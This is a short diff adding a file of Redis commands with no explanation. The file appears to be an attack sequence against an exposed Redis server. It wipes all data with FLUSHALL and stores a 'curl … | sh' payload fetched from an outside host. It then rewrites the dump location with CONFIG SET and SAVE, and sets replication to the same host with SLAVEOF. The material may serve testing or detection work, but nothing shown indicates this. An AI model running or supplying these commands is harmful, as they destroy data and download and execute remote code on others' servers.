@@ -1,0 +1,11 @@
+PING
+INFO server
+KEYS *
+FLUSHALL
+SET x "curl -s http://203.0.113.9/a.sh | sh"
+GET x
+CONFIG GET dir
+CONFIG SET dir /tmp
+CONFIG SET dbfilename root
+SAVE
+SLAVEOF 203.0.113.9 6379
